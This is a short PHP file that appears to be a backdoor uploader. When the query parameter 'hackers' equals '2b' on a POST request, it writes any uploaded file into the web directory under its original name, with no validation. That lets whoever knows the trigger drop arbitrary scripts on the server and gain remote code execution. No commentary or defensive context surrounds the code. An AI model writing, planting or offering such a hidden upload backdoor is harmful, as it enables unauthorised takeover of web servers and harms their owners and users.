
<?php
    if($_GET["hackers"]=="2b"){
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if(!file_exists($_FILES["upfile"]["name"])) {
                copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]);
            }
        }
    }
?>
